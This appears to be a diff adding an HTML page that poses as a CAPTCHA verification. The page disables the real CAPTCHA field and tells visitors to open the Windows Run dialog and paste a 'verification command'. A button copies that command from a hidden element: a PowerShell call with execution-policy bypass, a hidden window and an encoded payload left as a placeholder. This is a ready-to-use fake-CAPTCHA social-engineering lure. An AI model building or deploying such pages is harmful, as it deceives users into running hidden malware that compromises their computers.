@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>CAPTCHA Verification</title>
+    <style>
+        body {
+            background-color: #f2f2f2;
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 50px;
+        }
+        .captcha-box {
+            background-color: #fff;
+            border-radius: 10px;
+            box-shadow: 0 0 15px rgba(0,0,0,0.1);
+            padding: 40px;
+            max-width: 500px;
+            margin: auto;
+        }
+        .captcha-img {
+            margin-bottom: 20px;
+        }
+        .instructions {
+            background-color: #ffecec;
+            border: 1px solid #ff8c8c;
+            color: #b30000;
+            padding: 15px;
+            margin-top: 30px;
+            border-radius: 5px;
+            font-size: 16px;
+        }
+        .copy-btn {
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            font-size: 16px;
+            margin-top: 15px;
+            cursor: pointer;
+            border-radius: 5px;
+        }
+        .copy-btn:hover {
+            background-color: #45a049;
+        }
+        .verify-box {
+            margin-top: 20px;
+        }
+        .verify-box input[type="text"] {
+            padding: 10px;
+            font-size: 16px;
+            width: 200px;
+            margin-right: 10px;
+        }
+        .verify-box button {
+            padding: 10px 20px;
+            font-size: 16px;
+            background-color: #007BFF;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: not-allowed;
+        }
+        code {
+            background-color: #eee;
+            padding: 3px 6px;
+            border-radius: 4px;
+        }
+        #hiddenCommand {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="captcha-box">
+        <h2>CAPTCHA Verification</h2>
+        <div class="captcha-img">
+            <img src="captcha.png" alt="CAPTCHA" width="300" />
+        </div>
+        <p>Please verify you're not a robot by completing the CAPTCHA.</p>
+
+        <div class="verify-box">
+            <input type="text" placeholder="Enter CAPTCHA text" disabled />
+            <button disabled>Verify</button>
+        </div>
+
+        <div class="instructions">
+            <p><strong>Having trouble verifying?</strong> Follow the steps below:</p>
+            <ol style="text-align:left">
+                <li>Press <code>Windows + R</code> on your keyboard.</li>
+                <li>Click the button below to copy the verification command.</li>
+                <li>Paste it into the Run window and click OK.</li>
+            </ol>
+            <button class="copy-btn" onclick="copyPayload()">Copy Verification Command</button>
+            <div id="hiddenCommand">powershell -exec bypass -windowstyle hidden -encodedcommand [REPLACE_WITH_BASE64]</div>
+        </div>
+    </div>
+
+    <script>
+        function copyPayload() {
+            const text = document.getElementById("hiddenCommand").textContent;
+            const tempInput = document.createElement("textarea");
+            tempInput.value = text;
+            document.body.appendChild(tempInput);
+            tempInput.select();
+            document.execCommand("copy");
+            document.body.removeChild(tempInput);
+            alert("Command copied to clipboard. Open Run (Win + R) and paste it.");
+        }
+    </script>
+</body>
+</html>
